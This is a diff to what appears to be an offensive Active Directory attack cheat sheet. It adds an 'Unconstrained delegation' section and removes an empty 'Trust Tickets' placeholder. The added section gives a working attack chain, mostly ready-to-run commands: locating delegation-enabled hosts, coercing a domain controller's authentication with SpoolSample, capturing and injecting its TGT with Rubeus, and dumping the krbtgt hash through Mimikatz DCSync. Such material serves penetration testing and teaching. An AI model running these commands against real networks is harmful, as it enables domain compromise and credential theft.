@@ -11,7 +11,6 @@
   * [Password in AD User comment](#password-in-ad-user-comment)
   * [Golden Tickets](#passtheticket-golden-tickets)
   * [Silver Tickets](#passtheticket-silver-tickets)
-  * [Trust Tickets](#trust-tickets)
   * [Kerberoast](#kerberoast)
   * [KRB_AS_REP roasting](#krb_as_rep-roasting)
   * [Pass-the-Hash](#pass-the-hash)
@@ -20,6 +19,8 @@
   * [NTLMv2 hashes relaying](#ntlmv2-hashes-relaying)
   * [Dangerous Built-in Groups Usage](#dangerous-built-in-groups-usage)
   * [Trust relationship between domains](#trust-relationship-between-domains)
+  * [Unconstrained delegation](#unconstrained-delegation)
+  * [Resource-Based Constrained Delegation](#resource-based-constrained-delegation)
   * [PrivExchange attack](#privexchange-attack)
   * [Password spraying](#password-spraying)
 
@@ -443,10 +444,6 @@ export KRB5CCNAME=/home/user/ticket.ccache
 ./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.168.1.100 
 ```
 
-### Trust Tickets
-
-TODO
-
 ### Kerberoast
 
 > "A service principal name (SPN) is a unique identifier of a service instance. SPNs are used by Kerberos authentication to associate a service instance with a service logon account. " - [MSDN](https://docs.microsoft.com/fr-fr/windows/desktop/AD/service-principal-names)
@@ -608,6 +605,60 @@ SourceName          TargetName                    TrustType      TrustDirection
 domainA.local      domainB.local                  TreeRoot       Bidirectional
 ```
 
+### Unconstrained delegation
+
+#### Find delegation
+
+Check the `TrustedForDelegation` property.
+
+```powershell
+# From https://github.com/samratashok/ADModule
+PS> Get-ADComputer -Filter {TrustedForDelegation -eq $True}
+
+or 
+
+$> ldapdomaindump -u "DOMAIN\\Account" -p "Password123*" 10.10.10.10   
+grep TRUSTED_FOR_DELEGATION domain_computers.grep
+```
+
+NOTE: Domain controllers usually have unconstrained delegation enabled
+
+#### Monitor with Rubeus
+
+Monitor incoming connections from Rubeus.
+
+```powershell
+Rubeus.exe monitor /interval:1 
+```
+
+#### Force a connect back from the DC
+
+>  SpoolSample is a PoC to coerce a Windows host to authenticate to an arbitrary server using a "feature" in the MS-RPRN RPC interface 
+
+```powershell
+# From https://github.com/leechristensen/SpoolSample
+.\SpoolSample.exe VICTIM-DC-NAME UNCONSTRAINED-SERVER-DC-NAME
+.\SpoolSample.exe DC01.HACKER.LAB HELPDESK.HACKER.LAB
+# DC01.HACKER.LAB is the domain controller we want to compromise
+# HELPDESK.HACKER.LAB is the machine with delegation enabled that we control.
+```
+
+If the attack worked you should get a TGT of the domain controller.
+
+#### Load the ticket
+
+Extract the base64 TGT from Rubeus output and load it to our current session.
+
+```powershell
+.\Rubeus.exe asktgs /ticket:<ticket base64> /ptt
+```
+
+Then you can use DCsync or another attack : `Mimikatz> lsadump::dcsync /user:HACKER\krbtgt`
+
+### Resource-Based Constrained Delegation
+
+TODO
+
 ### PrivExchange attack
 
 Exchange your privileges for Domain Admin privs by abusing Exchange.
@@ -712,3 +763,5 @@ Most of the time the best passwords to spray are :
 * [Post-OSCP Series Part 2 - Kerberoasting - 16 APRIL 2019 - Jon Hickman](https://0metasecurity.com/post-oscp-part-2/)
 * [WHAT’S SPECIAL ABOUT THE BUILTIN ADMINISTRATOR ACCOUNT? - 21/05/2012 - MORGAN SIMONSEN](https://morgansimonsen.com/2012/05/21/whats-special-about-the-builtin-administrator-account-12/)
 * [Exploiting MS14-068 with PyKEK and Kali - 14 DEC 2014 - ZACH GRACE @ztgrace](https://zachgrace.com/posts/exploiting-ms14-068/)
+* [Hunting in Active Directory: Unconstrained Delegation & Forests Trusts - Roberto Rodriguez - Nov 28, 2018](https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1)
+* [Exploiting Unconstrained Delegation - Riccardo Ancarani - 28 APRIL 2019](https://www.riccardoancarani.it/exploiting-unconstrained-delegation/)
